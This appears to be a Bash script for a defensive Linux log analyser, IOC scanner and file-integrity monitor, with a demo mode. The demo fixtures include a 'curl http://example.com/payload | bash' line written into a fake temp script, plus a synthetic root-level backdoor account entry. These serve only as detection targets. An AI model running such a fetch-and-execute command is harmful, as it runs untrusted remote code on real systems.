#!/usr/bin/env bash
###############################################################################
#  SentinelGuard v1.0.0
#  All-in-One Linux Security Log Analyzer & IOC / File-Integrity Toolkit
###############################################################################
#  Author  : <Your Name Here>
#  License : MIT
#
#  DESCRIPTION
#  -----------
#  SentinelGuard is a modular Bash automation tool built for Blue-Team /
#  SOC-style workflows on Linux. It combines four security modules into a
#  single CLI:
#
#    1. LOG ANALYZER      Parses auth/syslog-style log files to detect
#                          brute-force SSH attacks, flag the attacking IPs,
#                          spot successful logins that follow a brute-force
#                          burst (possible compromise), and summarize sudo
#                          usage + new user account creation.
#
#    2. IOC SCANNER        Hunts a directory tree for common indicators of
#                          compromise: SUID/SGID binaries, world-writable
#                          files, hidden files, recently modified files,
#                          suspicious scripts dropped in /tmp or /dev/shm,
#                          and (optionally) SHA-256 matches against a
#                          user-supplied malware hash blocklist.
#
#    3. FILE INTEGRITY     Creates a SHA-256 baseline of a directory tree and
#       MONITOR (FIM)      later verifies it, reporting new / modified /
#                          deleted files -- classic tripwire-style FIM.
#
#    4. REAL-TIME MONITOR  Live-tails a log file and raises instant,
#                          colour-coded alerts as malicious patterns appear.
#
#  Every scan is written to a timestamped, human-readable report (and
#  optionally a styled HTML report) so results can be archived or shared.
#
#  A --demo mode ships with a synthetic log generator, so the ENTIRE tool
#  can be exercised on any machine -- no root access or real logs required.
#  This makes it easy for anyone (recruiters included!) to clone the repo
#  and see it work in 10 seconds: ./sentinelguard.sh --demo
###############################################################################

set -uo pipefail
# NOTE: intentionally NOT using 'set -e'. Tools like grep/find legitimately
# return non-zero on "no match found", which is normal control flow here,
# not an error condition. Every risky command is checked explicitly instead.

###############################################################################
# 0. PRE-FLIGHT CHECKS
###############################################################################

# SentinelGuard uses associative arrays (declare -A), which require Bash 4+.
if (( BASH_VERSINFO[0] < 4 )); then
    echo "ERROR: SentinelGuard requires Bash 4.0 or newer (found ${BASH_VERSION})." >&2
    exit 1
fi

check_dependencies() {
    local deps=(awk grep sed find sort uniq date sha256sum xargs)
    local missing=()
    for d in "${deps[@]}"; do
        command -v "$d" >/dev/null 2>&1 || missing+=("$d")
    done
    if (( ${#missing[@]} > 0 )); then
        echo "ERROR: Missing required tools: ${missing[*]}" >&2
        echo "Install them with your package manager and try again." >&2
        exit 1
    fi
}

###############################################################################
# 1. COLOUR / UI SETUP
###############################################################################

# Only enable colour codes on an interactive terminal that supports them.
# This keeps report files and piped output (e.g. `| less`) clean.
if [[ -t 1 ]] && command -v tput >/dev/null 2>&1 && (( $(tput colors 2>/dev/null || echo 0) >= 8 )); then
    RED=$(tput setaf 1);    GREEN=$(tput setaf 2)
    YELLOW=$(tput setaf 3); BLUE=$(tput setaf 4)
    MAGENTA=$(tput setaf 5);CYAN=$(tput setaf 6)
    BOLD=$(tput bold);      NC=$(tput sgr0)
else
    RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; NC=""
fi

print_banner() {
    echo -e "${CYAN}${BOLD}"
    cat <<'EOF'
   _____            __  _            _  _____                     _
  / ____|          / _|(_)          | ||  __ \                   | |
 | (___   ___ _ __ | |_ _ _ __   ___| || |  \/_   _  __ _ _ __ __| |
  \___ \ / _ \ '_ \|  _| | '_ \ / _ \ || | __| | | |/ _` | '__/ _` |
  ____) |  __/ | | | | | | | | |  __/ || |_\ \ |_| | (_| | | | (_| |
 |_____/ \___|_| |_|_| |_|_| |_|\___|_(_)____/\__,_|\__,_|_|  \__,_|
EOF
    echo -e "${NC}${BLUE}   Linux Security Log Analyzer  |  IOC Scanner  |  File Integrity Monitor${NC}"
    echo -e "${BLUE}   ---------------------------------------------------------------------${NC}"
    echo -e "   ${BOLD}v1.0.0${NC}   $(date '+%Y-%m-%d %H:%M:%S %Z')"
    echo ""
}

print_section() {
    out ""
    out "${MAGENTA}${BOLD}============================================================${NC}"
    out "${MAGENTA}${BOLD} $1${NC}"
    out "${MAGENTA}${BOLD}============================================================${NC}"
}

log_info()    { echo -e "${BLUE}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}${BOLD}[OK]${NC} $1"; log_action "OK: $1"; }
log_warn()    { echo -e "${YELLOW}${BOLD}[WARN]${NC} $1"; log_action "WARN: $1"; }
log_error()   { echo -e "${RED}${BOLD}[ERROR]${NC} $1" >&2; log_action "ERROR: $1"; }

# Writes tool activity (not scan results) to a persistent operational log.
log_action() {
    [[ -n "${TOOL_LOG:-}" ]] && echo "[$(date '+%F %T')] $1" >> "$TOOL_LOG" 2>/dev/null
}

# out(): prints to the terminal (with colour) AND appends a colour-stripped
# copy to the active report file, if one is set. This keeps a single
# source of truth for every module's output.
out() {
    echo -e "$1"
    if [[ -n "${REPORT_FILE:-}" ]]; then
        echo -e "$1" | sed -r 's/\x1B\[[0-9;]*[a-zA-Z]//g' >> "$REPORT_FILE"
    fi
}

###############################################################################
# 2. DEFAULTS / GLOBAL STATE
###############################################################################

MODE=""
LOG_FILE="/var/log/auth.log"
SCAN_DIR="."
REPORT_DIR="./sentinelguard_reports"
BASELINE_FILE="./sentinelguard_reports/baseline.sha256"
BASELINE_ACTION=""
THRESHOLD=5              # failed logins from one IP => brute-force flag
RECENT_HOURS=24           # "recently modified" window for IOC scan
HTML_REPORT=false
DEMO_MODE=false
INTERACTIVE=false
VERBOSE=false
BLOCKLIST_FILE=""
declare -a BRUTE_FORCE_IPS=()

timestamp() { date '+%Y%m%d_%H%M%S'; }

###############################################################################
# 3. HELP / USAGE
###############################################################################

show_help() {
cat <<EOF
${BOLD}SentinelGuard v1.0.0${NC} - Linux Security Log Analyzer & IOC Toolkit

${BOLD}USAGE${NC}
  ./sentinelguard.sh [OPTIONS]
  ./sentinelguard.sh                     # no args -> interactive menu

${BOLD}MODES${NC} (-m / --mode)
  logscan       Analyze an auth/syslog file for brute-force & login activity
  ioc           Scan a directory for indicators of compromise
  integrity     Create or check a SHA-256 file-integrity baseline
  monitor       Live-tail a log file with real-time colour-coded alerts
  all           Run logscan + ioc + integrity check together

${BOLD}OPTIONS${NC}
  -m, --mode <mode>          Select a mode (see above)
  -f, --file <path>          Log file to analyze/monitor   (default: $LOG_FILE)
  -d, --dir <path>           Directory to scan / baseline  (default: $SCAN_DIR)
  -o, --output <dir>         Report output directory       (default: $REPORT_DIR)
  -t, --threshold <n>        Failed-login count that triggers a brute-force
                              alert for a single IP          (default: $THRESHOLD)
      --hours <n>            "Recently modified" window, in hours, for IOC
                              scan                            (default: $RECENT_HOURS)
  -b, --baseline             Create a new integrity baseline (mode=integrity)
  -c, --check                Check integrity against baseline (mode=integrity)
      --baseline-file <path> Baseline file path             (default: $BASELINE_FILE)
      --blocklist <path>     File of known-bad SHA-256 hashes to match during
                              an IOC scan (one hash per line)
  -w, --watch                Shortcut for --mode monitor
  -i, --interactive           Force the interactive menu
      --html                 Also export an HTML version of the report
      --demo                 Generate a synthetic demo log & baseline data
                              so you can try every feature with no setup
  -v, --verbose               Verbose output
  -h, --help                  Show this help message and exit

${BOLD}EXAMPLES${NC}
  # Fastest way to see everything working, no root / real logs needed:
  ./sentinelguard.sh --demo

  # Analyze the real system auth log (may need sudo) for brute-force IPs:
  sudo ./sentinelguard.sh -m logscan -f /var/log/auth.log -t 5

  # Scan /var/www for indicators of compromise, flag anything modified
  # in the last 6 hours:
  ./sentinelguard.sh -m ioc -d /var/www --hours 6

  # Scan a directory against a known-malware hash blocklist:
  ./sentinelguard.sh -m ioc -d /opt/app --blocklist bad_hashes.txt

  # Create an integrity baseline for a critical directory:
  ./sentinelguard.sh -m integrity -b -d /etc

  # Later, check the same directory for tampering:
  ./sentinelguard.sh -m integrity -c -d /etc

  # Watch a log file live for attacks as they happen:
  ./sentinelguard.sh -w -f /var/log/auth.log

  # Run every module at once and export an HTML report:
  ./sentinelguard.sh -m all -f /var/log/auth.log -d /etc --html

  # No arguments at all launches a friendly menu:
  ./sentinelguard.sh
EOF
}

###############################################################################
# 4. DEMO DATA GENERATOR
###############################################################################
# Produces a realistic, synthetic auth.log so every feature can be
# demonstrated on any machine, with no root access and no real log files.
generate_demo_log() {
    local out_file="$1"
    log_info "Generating synthetic auth.log demo data -> $out_file"
    : > "$out_file"

    local users=(root admin ubuntu deploy backup test guest oracle jenkins svc_backup)
    local attacker_ips=(45.33.12.201 185.220.101.5 194.61.24.9)
    local normal_ips=(192.168.1.10 192.168.1.15 10.0.0.5 172.16.0.20)
    local now_epoch
    now_epoch=$(date +%s)

    fake_ts() {
        # $1 = seconds to subtract from now
        date -d "@$(( now_epoch - $1 ))" '+%b %e %H:%M:%S' 2>/dev/null || date '+%b %e %H:%M:%S'
    }

    # -- benign successful logins scattered over the last hour --
    for _ in {1..5}; do
        local ip=${normal_ips[$((RANDOM % ${#normal_ips[@]}))]}
        local user=${users[$((RANDOM % ${#users[@]}))]}
        echo "$(fake_ts $((RANDOM % 3600))) demo-host sshd[$((RANDOM%9000+1000))]: Accepted password for $user from $ip port $((RANDOM%60000+1024)) ssh2" >> "$out_file"
    done

    # -- brute-force cluster from attacker #1 (>= default threshold) --
    local bf_ip="${attacker_ips[0]}"
    for i in {1..15}; do
        local user=${users[$((RANDOM % ${#users[@]}))]}
        echo "$(fake_ts $((7200 - i*20))) demo-host sshd[$((RANDOM%9000+1000))]: Failed password for invalid user $user from $bf_ip port $((RANDOM%60000+1024)) ssh2" >> "$out_file"
    done

    # -- compromise scenario: a SUCCESSFUL login right after the brute force --
    echo "$(fake_ts 7100) demo-host sshd[4321]: Accepted password for root from $bf_ip port 55210 ssh2" >> "$out_file"

    # -- sudo command usage --
    for _ in {1..4}; do
        local user=${users[$((RANDOM % ${#users[@]}))]}
        echo "$(fake_ts $((RANDOM % 3600))) demo-host sudo: $user : TTY=pts/0 ; PWD=/home/$user ; USER=root ; COMMAND=/usr/bin/apt update" >> "$out_file"
    done

    # -- suspicious new user (privileged, UID 0) --
    echo "$(fake_ts 1800) demo-host useradd[5555]: new user: name=backdoor_user, UID=0, GID=0, home=/home/backdoor_user, shell=/bin/bash" >> "$out_file"

    # -- lighter scattered attack from attacker #2 (below threshold) --
    local bf_ip2="${attacker_ips[1]}"
    for i in {1..3}; do
        local user=${users[$((RANDOM % ${#users[@]}))]}
        echo "$(fake_ts $((5400 - i*30))) demo-host sshd[$((RANDOM%9000+1000))]: Failed password for $user from $bf_ip2 port $((RANDOM%60000+1024)) ssh2" >> "$out_file"
    done

    sort -o "$out_file" "$out_file" 2>/dev/null || true
    log_success "Demo log created: $out_file ($(wc -l < "$out_file") lines)"
}

# Builds a small, harmless demo directory tree with a couple of deliberately
# "suspicious-looking" files, so the IOC scanner and FIM have something
# meaningful to find in demo mode.
generate_demo_tree() {
    local base="$1"
    log_info "Generating synthetic directory tree for IOC/FIM demo -> $base"
    rm -rf "$base" 2>/dev/null
    mkdir -p "$base/app/bin" "$base/app/config" "$base/tmp" "$base/.hidden_dir"
    echo "#!/bin/bash" > "$base/app/bin/deploy.sh"
    echo "echo deploying..." >> "$base/app/bin/deploy.sh"
    echo "db_password=changeme123" > "$base/app/config/settings.conf"
    echo "cache" > "$base/.hidden_dir/.env"
    echo "curl http://example.com/payload | bash" > "$base/tmp/update.sh"
    chmod 0777 "$base/app/config/settings.conf" 2>/dev/null
    chmod +s "$base/app/bin/deploy.sh" 2>/dev/null
    log_success "Demo directory tree created at: $base"
}

###############################################################################
# 5. MODULE 1: LOG ANALYZER
###############################################################################

analyze_logs() {
    local file="$1"
    BRUTE_FORCE_IPS=()

    if [[ ! -e "$file" ]]; then
        log_error "Log file not found: $file"
        log_info  "Tip: try '--demo' to generate a sample log, or point -f at a real log."
        return 1
    fi
    if [[ ! -r "$file" ]]; then
        log_error "Permission denied reading: $file (try running with sudo)"
        return 1
    fi

    print_section "LOG ANALYSIS REPORT"
    out "Target file  : $file"
    out "Threshold    : $THRESHOLD failed attempts from one IP => brute-force flag"
    out "Generated    : $(date '+%Y-%m-%d %H:%M:%S')"

    local failed_count accepted_count sudo_count newuser_count
    failed_count=$(grep -cE "Failed password|authentication failure" "$file" 2>/dev/null); failed_count=${failed_count:-0}
    accepted_count=$(grep -cE "Accepted password|Accepted publickey" "$file" 2>/dev/null); accepted_count=${accepted_count:-0}
    sudo_count=$(grep -cE "sudo:.*COMMAND=" "$file" 2>/dev/null); sudo_count=${sudo_count:-0}
    newuser_count=$(grep -cE "new user:" "$file" 2>/dev/null); newuser_count=${newuser_count:-0}

    out ""
    out "${BOLD}Summary${NC}"
    out "  Failed login attempts : $failed_count"
    out "  Successful logins     : $accepted_count"
    out "  Sudo command usages   : $sudo_count"
    out "  New user creations    : $newuser_count"

    out ""
    out "${BOLD}Top Failed-Login Source IPs${NC}"
    local ip_table
    ip_table=$(grep -E "Failed password" "$file" 2>/dev/null \
        | grep -oE "from ([0-9]{1,3}\.){3}[0-9]{1,3}" \
        | awk '{print $2}' | sort | uniq -c | sort -rn | head -10)

    if [[ -z "$ip_table" ]]; then
        out "  None found."
    else
        while read -r count ip; do
            [[ -z "$ip" ]] && continue
            if (( count >= THRESHOLD )); then
                out "  ${RED}${BOLD}[BRUTE-FORCE]${NC} $ip -> $count failed attempts"
                BRUTE_FORCE_IPS+=("$ip")
            else
                out "  [info] $ip -> $count failed attempts"
            fi
        done <<< "$ip_table"
    fi

    out ""
    out "${BOLD}Possible Compromise Indicators${NC}"
    local compromise_found=false
    for ip in "${BRUTE_FORCE_IPS[@]:-}"; do
        [[ -z "$ip" ]] && continue
        if grep -qE "Accepted (password|publickey) for .* from $ip " "$file" 2>/dev/null; then
            out "  ${RED}${BOLD}[ALERT]${NC} Successful login from brute-force source $ip -- investigate immediately!"
            compromise_found=true
        fi
    done
    $compromise_found || out "  No compromise indicators detected."

    if (( newuser_count > 0 )); then
        out ""
        out "${BOLD}New User Accounts Created${NC}"
        while IFS= read -r uname; do
            [[ -z "$uname" ]] && continue
            out "  ${YELLOW}[NEW USER]${NC} $uname"
        done < <(grep "new user:" "$file" 2>/dev/null | sed -E 's/.*new user: name=([^,]+).*/\1/')
    fi

    out ""
    out "${GREEN}Log analysis completed.${NC}"
}

###############################################################################
# 6. MODULE 2: IOC SCANNER
###############################################################################

ioc_scan() {
    local dir="$1"

    if [[ ! -d "$dir" ]]; then
        log_error "Directory not found: $dir"
        return 1
    fi
    if [[ ! -r "$dir" ]]; then
        log_error "Permission denied reading directory: $dir"
        return 1
    fi

    print_section "IOC SCAN REPORT"
    out "Target directory   : $(readlink -f "$dir" 2>/dev/null || echo "$dir")"
    out "Recent-file window : last ${RECENT_HOURS}h"
    out "Generated          : $(date '+%Y-%m-%d %H:%M:%S')"

    out ""
    out "${BOLD}[1] SUID files (privilege-escalation risk)${NC}"
    local suid_files
    suid_files=$(find "$dir" -type f -perm -4000 2>/dev/null)
    if [[ -z "$suid_files" ]]; then out "  None found."
    else while IFS= read -r f; do out "  ${YELLOW}[SUID]${NC} $f"; done <<< "$suid_files"; fi

    out ""
    out "${BOLD}[2] SGID files${NC}"
    local sgid_files
    sgid_files=$(find "$dir" -type f -perm -2000 2>/dev/null)
    if [[ -z "$sgid_files" ]]; then out "  None found."
    else while IFS= read -r f; do out "  ${YELLOW}[SGID]${NC} $f"; done <<< "$sgid_files"; fi

    out ""
    out "${BOLD}[3] World-writable files (tamper risk)${NC}"
    local ww_files
    ww_files=$(find "$dir" -type f -perm -0002 2>/dev/null)
    if [[ -z "$ww_files" ]]; then out "  None found."
    else while IFS= read -r f; do out "  ${RED}[WORLD-WRITABLE]${NC} $f"; done <<< "$ww_files"; fi

    out ""
    out "${BOLD}[4] Hidden files${NC}"
    local hidden_files
    hidden_files=$(find "$dir" -type f -name ".*" 2>/dev/null | head -50)
    if [[ -z "$hidden_files" ]]; then out "  None found."
    else while IFS= read -r f; do out "  [hidden] $f"; done <<< "$hidden_files"; fi

    out ""
    out "${BOLD}[5] Recently modified files (last ${RECENT_HOURS}h)${NC}"
    local recent_files
    recent_files=$(find "$dir" -type f -mmin "-$(( RECENT_HOURS * 60 ))" 2>/dev/null | head -50)
    if [[ -z "$recent_files" ]]; then out "  None found."
    else while IFS= read -r f; do out "  ${CYAN}[recent]${NC} $f"; done <<< "$recent_files"; fi

    out ""
    out "${BOLD}[6] Suspicious scripts in temp locations (/tmp, /dev/shm)${NC}"
    local susp
    susp=$(find "$dir" \( -path "*/tmp/*" -o -path "*/dev/shm/*" \) -type f \
        \( -iname "*.sh" -o -iname "*.py" -o -iname "*.elf" -o -iname "*.bin" -o -iname "*.pl" \) 2>/dev/null)
    if [[ -z "$susp" ]]; then out "  None found."
    else while IFS= read -r f; do out "  ${RED}${BOLD}[SUSPICIOUS]${NC} $f"; done <<< "$susp"; fi

    if [[ -n "$BLOCKLIST_FILE" ]]; then
        out ""
        out "${BOLD}[7] Known-malware hash matches (blocklist: $BLOCKLIST_FILE)${NC}"
        if [[ ! -f "$BLOCKLIST_FILE" ]]; then
            out "  ${YELLOW}Blocklist file not found -- skipping this check.${NC}"
        else
            local matches=0
            while IFS= read -r f; do
                [[ -f "$f" ]] || continue
                local h
                h=$(sha256sum "$f" 2>/dev/null | awk '{print $1}')
                [[ -z "$h" ]] && continue
                if grep -qF "$h" "$BLOCKLIST_FILE" 2>/dev/null; then
                    out "  ${RED}${BOLD}[MALWARE MATCH]${NC} $f  (sha256: $h)"
                    matches=$((matches+1))
                fi
            done < <(find "$dir" -type f 2>/dev/null)
            (( matches == 0 )) && out "  No matches found."
        fi
    fi

    out ""
    out "${GREEN}IOC scan completed.${NC}"
}

###############################################################################
# 7. MODULE 3: FILE INTEGRITY MONITOR (FIM)
###############################################################################

create_baseline() {
    local dir="$1" baseline="$2"
    if [[ ! -d "$dir" ]]; then log_error "Directory not found: $dir"; return 1; fi
    if [[ ! -r "$dir" ]]; then log_error "Permission denied reading directory: $dir"; return 1; fi

    mkdir -p "$(dirname "$baseline")" 2>/dev/null
    log_info "Creating SHA-256 integrity baseline for: $dir"
    find "$dir" -type f 2>/dev/null | sort | xargs -r sha256sum 2>/dev/null > "$baseline"
    local count
    count=$(wc -l < "$baseline" 2>/dev/null || echo 0)
    log_success "Baseline created: $baseline ($count files hashed)"
}

check_baseline() {
    local dir="$1" baseline="$2"
    if [[ ! -f "$baseline" ]]; then
        log_error "Baseline file not found: $baseline"
        log_info  "Create one first with: --mode integrity --baseline --dir $dir"
        return 1
    fi
    if [[ ! -d "$dir" ]]; then log_error "Directory not found: $dir"; return 1; fi

    print_section "FILE INTEGRITY CHECK REPORT"
    out "Directory : $dir"
    out "Baseline  : $baseline"
    out "Generated : $(date '+%Y-%m-%d %H:%M:%S')"

    local -A baseline_hash
    local h p
    while read -r h p; do
        [[ -z "$p" ]] && continue
        baseline_hash["$p"]="$h"
    done < "$baseline"

    local -A current_hash
    while IFS= read -r f; do
        local ch
        ch=$(sha256sum "$f" 2>/dev/null | awk '{print $1}')
        current_hash["$f"]="$ch"
    done < <(find "$dir" -type f 2>/dev/null)

    local modified=0 new=0 deleted=0 unchanged=0

    out ""
    out "${BOLD}New / Modified files${NC}"
    local any_changed=false
    for f in "${!current_hash[@]}"; do
        if [[ -z "${baseline_hash[$f]+x}" ]]; then
            out "  ${YELLOW}${BOLD}[NEW]${NC} $f"
            new=$((new+1)); any_changed=true
        elif [[ "${baseline_hash[$f]}" != "${current_hash[$f]}" ]]; then
            out "  ${RED}${BOLD}[MODIFIED]${NC} $f"
            modified=$((modified+1)); any_changed=true
        else
            unchanged=$((unchanged+1))
        fi
    done
    $any_changed || out "  None found."

    out ""
    out "${BOLD}Deleted files${NC}"
    local any_deleted=false
    for f in "${!baseline_hash[@]}"; do
        if [[ -z "${current_hash[$f]+x}" ]]; then
            out "  ${RED}[DELETED]${NC} $f"
            deleted=$((deleted+1)); any_deleted=true
        fi
    done
    $any_deleted || out "  None found."

    out ""
    out "${BOLD}Summary:${NC} unchanged=$unchanged  new=$new  modified=$modified  deleted=$deleted"
    if (( new > 0 || modified > 0 || deleted > 0 )); then
        out "${RED}${BOLD}Integrity status: CHANGES DETECTED${NC}"
    else
        out "${GREEN}${BOLD}Integrity status: CLEAN${NC}"
    fi
}

###############################################################################
# 8. MODULE 4: REAL-TIME MONITOR
###############################################################################

monitor_log() {
    local file="$1"
    if [[ ! -e "$file" ]]; then log_error "Log file not found: $file"; return 1; fi
    if [[ ! -r "$file" ]]; then log_error "Permission denied: $file"; return 1; fi

    print_section "REAL-TIME MONITOR"
    out "Watching: $file   (Ctrl+C to stop)"
    echo ""

    local failed=0 accepted=0 sudo_events=0

    # Cleanup handler: fires on Ctrl+C (INT), on `timeout`'s signal (TERM),
    # and on normal exit. It explicitly kills the background `tail -f`
    # process below by pattern -- without this, tail can outlive the
    # script as an orphan and keep a pipe open indefinitely.
    _monitor_cleanup() {
        echo ""
        echo -e "${BOLD}Monitoring stopped.${NC}  failed=$failed  accepted=$accepted  sudo=$sudo_events"
        log_action "Monitor session ended: failed=$failed accepted=$accepted sudo=$sudo_events"
        pkill -f "tail -n0 -f $file" 2>/dev/null
        trap - INT TERM
    }
    trap '_monitor_cleanup; return 0' INT TERM

    # Using process substitution (NOT a pipe) keeps this loop in the current
    # shell, so the counters above persist correctly for the trap handler.
    while IFS= read -r line; do
        case "$line" in
            *"Failed password"*|*"authentication failure"*)
                echo -e "${RED}${BOLD}[ALERT] Failed login:${NC} $line"
                failed=$((failed+1)) ;;
            *"Accepted password"*|*"Accepted publickey"*)
                echo -e "${GREEN}[INFO] Successful login:${NC} $line"
                accepted=$((accepted+1)) ;;
            *"sudo:"*"COMMAND="*)
                echo -e "${YELLOW}[SUDO]${NC} $line"
                sudo_events=$((sudo_events+1)) ;;
            *"new user:"*)
                echo -e "${MAGENTA}${BOLD}[NEW USER]${NC} $line" ;;
            *) : ;;
        esac
    done < <(tail -n0 -f "$file" 2>/dev/null)

    # Reached only if the tail stream ends on its own (e.g. log file was
    # rotated/removed) rather than via Ctrl+C. Clean up defensively so no
    # orphaned tail process is left running.
    pkill -f "tail -n0 -f $file" 2>/dev/null
    trap - INT TERM
    echo -e "${YELLOW}Log stream ended.${NC}  failed=$failed  accepted=$accepted  sudo=$sudo_events"
}

###############################################################################
# 9. REPORTING
###############################################################################

finalize_report() {
    if [[ -n "${REPORT_FILE:-}" && -f "$REPORT_FILE" ]]; then
        log_success "Report saved: $REPORT_FILE"
        $HTML_REPORT && generate_html_report "$REPORT_FILE"
    fi
}

generate_html_report() {
    local txt="$1"
    local html="${txt%.txt}.html"
    {
        echo "<!DOCTYPE html><html><head><meta charset='utf-8'>"
        echo "<title>SentinelGuard Report</title>"
        echo "<style>"
        echo "body{background:#0d1117;color:#c9d1d9;font-family:'Consolas','Courier New',monospace;padding:24px;}"
        echo "h1{color:#58a6ff;border-bottom:1px solid #30363d;padding-bottom:10px;}"
        echo "pre{background:#161b22;padding:20px;border-radius:8px;border:1px solid #30363d;"
        echo "    white-space:pre-wrap;word-wrap:break-word;font-size:14px;line-height:1.5;}"
        echo ".footer{color:#8b949e;font-size:12px;margin-top:16px;}"
        echo "</style></head><body>"
        echo "<h1>&#128737; SentinelGuard Security Report</h1>"
        echo "<pre>"
        sed -e 's/&/\&amp;/g' -e 's/</\&lt;/g' -e 's/>/\&gt;/g' "$txt"
        echo "</pre>"
        echo "<div class='footer'>Generated by SentinelGuard v1.0.0 on $(date '+%Y-%m-%d %H:%M:%S')</div>"
        echo "</body></html>"
    } > "$html" 2>/dev/null
    log_success "HTML report saved: $html"
}

###############################################################################
# 10. INTERACTIVE MENU
###############################################################################

interactive_menu() {
    print_banner
    while true; do
        echo ""
        echo -e "${BOLD}Select an option:${NC}"
        echo "  1) Analyze a log file (brute-force / login analysis)"
        echo "  2) Scan a directory for IOCs"
        echo "  3) Create a file-integrity baseline"
        echo "  4) Check file integrity against baseline"
        echo "  5) Real-time log monitor"
        echo "  6) Generate demo data (log + directory tree)"
        echo "  7) Help"
        echo "  0) Exit"
        read -rp "Enter choice [0-7]: " choice
        case "$choice" in
            1)
                read -rp "Log file path [$LOG_FILE]: " inp
                LOG_FILE="${inp:-$LOG_FILE}"
                REPORT_FILE="$REPORT_DIR/logscan_$(timestamp).txt"
                analyze_logs "$LOG_FILE"; finalize_report ;;
            2)
                read -rp "Directory to scan [$SCAN_DIR]: " inp
                SCAN_DIR="${inp:-$SCAN_DIR}"
                REPORT_FILE="$REPORT_DIR/ioc_$(timestamp).txt"
                ioc_scan "$SCAN_DIR"; finalize_report ;;
            3)
                read -rp "Directory to baseline [$SCAN_DIR]: " inp
                SCAN_DIR="${inp:-$SCAN_DIR}"
                create_baseline "$SCAN_DIR" "$BASELINE_FILE" ;;
            4)
                REPORT_FILE="$REPORT_DIR/integrity_$(timestamp).txt"
                check_baseline "$SCAN_DIR" "$BASELINE_FILE"; finalize_report ;;
            5)
                read -rp "Log file to monitor [$LOG_FILE]: " inp
                LOG_FILE="${inp:-$LOG_FILE}"
                monitor_log "$LOG_FILE" ;;
            6)
                LOG_FILE="$REPORT_DIR/demo_auth.log"
                SCAN_DIR="$REPORT_DIR/demo_tree"
                generate_demo_log "$LOG_FILE"
                generate_demo_tree "$SCAN_DIR"
                log_info "Try option 2 on '$SCAN_DIR', or option 3 then re-run after editing a file." ;;
            7) show_help ;;
            0) echo "Goodbye."; exit 0 ;;
            *) log_warn "Invalid choice, please enter a number from 0-7." ;;
        esac
    done
}

###############################################################################
# 11. ARGUMENT PARSING
###############################################################################

parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -m|--mode)          MODE="$2"; shift 2 ;;
            -f|--file)          LOG_FILE="$2"; shift 2 ;;
            -d|--dir)           SCAN_DIR="$2"; shift 2 ;;
            -o|--output)        REPORT_DIR="$2"; shift 2 ;;
            -t|--threshold)
                if ! [[ "${2:-}" =~ ^[0-9]+$ ]]; then log_error "--threshold requires a positive integer"; exit 1; fi
                THRESHOLD="$2"; shift 2 ;;
            --hours)
                if ! [[ "${2:-}" =~ ^[0-9]+$ ]]; then log_error "--hours requires a positive integer"; exit 1; fi
                RECENT_HOURS="$2"; shift 2 ;;
            -b|--baseline)      MODE="integrity"; BASELINE_ACTION="create"; shift ;;
            -c|--check)         MODE="integrity"; BASELINE_ACTION="check"; shift ;;
            --baseline-file)    BASELINE_FILE="$2"; shift 2 ;;
            --blocklist)        BLOCKLIST_FILE="$2"; shift 2 ;;
            -w|--watch)         MODE="monitor"; shift ;;
            -i|--interactive)   INTERACTIVE=true; shift ;;
            --html)             HTML_REPORT=true; shift ;;
            --demo)             DEMO_MODE=true; shift ;;
            -v|--verbose)       VERBOSE=true; shift ;;
            -h|--help)          show_help; exit 0 ;;
            *) log_error "Unknown option: $1"; echo ""; show_help; exit 1 ;;
        esac
    done
    [[ -z "$BASELINE_ACTION" ]] && BASELINE_ACTION="check"
}

###############################################################################
# 12. MAIN
###############################################################################

main() {
    local ARGC=$#
    check_dependencies
    parse_args "$@"

    if ! mkdir -p "$REPORT_DIR" 2>/dev/null; then
        echo "ERROR: Cannot create report directory: $REPORT_DIR" >&2
        exit 1
    fi
    TOOL_LOG="$REPORT_DIR/sentinelguard_tool.log"
    log_action "Invoked with: $* (mode=$MODE)"

    if $DEMO_MODE; then
        print_banner
        LOG_FILE="$REPORT_DIR/demo_auth.log"
        SCAN_DIR="$REPORT_DIR/demo_tree"
        generate_demo_log "$LOG_FILE"
        generate_demo_tree "$SCAN_DIR"
        [[ -z "$MODE" ]] && MODE="all"
    fi

    if (( ARGC == 0 )) || $INTERACTIVE; then
        interactive_menu
        exit 0
    fi

    local exit_code=0

    case "$MODE" in
        logscan|log)
            REPORT_FILE="$REPORT_DIR/logscan_$(timestamp).txt"
            print_banner
            analyze_logs "$LOG_FILE" || exit_code=1
            finalize_report ;;
        ioc)
            REPORT_FILE="$REPORT_DIR/ioc_$(timestamp).txt"
            print_banner
            ioc_scan "$SCAN_DIR" || exit_code=1
            finalize_report ;;
        integrity)
            print_banner
            if [[ "$BASELINE_ACTION" == "create" ]]; then
                create_baseline "$SCAN_DIR" "$BASELINE_FILE" || exit_code=1
            else
                REPORT_FILE="$REPORT_DIR/integrity_$(timestamp).txt"
                check_baseline "$SCAN_DIR" "$BASELINE_FILE" || exit_code=1
                finalize_report
            fi ;;
        monitor)
            print_banner
            monitor_log "$LOG_FILE" || exit_code=1 ;;
        all)
            REPORT_FILE="$REPORT_DIR/full_scan_$(timestamp).txt"
            print_banner
            analyze_logs "$LOG_FILE" || exit_code=1
            ioc_scan "$SCAN_DIR" || exit_code=1
            if [[ -f "$BASELINE_FILE" ]]; then
                check_baseline "$SCAN_DIR" "$BASELINE_FILE" || exit_code=1
            else
                out ""
                out "${YELLOW}(Skipping integrity check: no baseline found. Create one with --mode integrity --baseline.)${NC}"
            fi
            finalize_report ;;
        "")
            show_help ;;
        *)
            log_error "Unknown mode: $MODE"
            echo ""
            show_help
            exit_code=1 ;;
    esac

    exit "$exit_code"
}

main "$@"
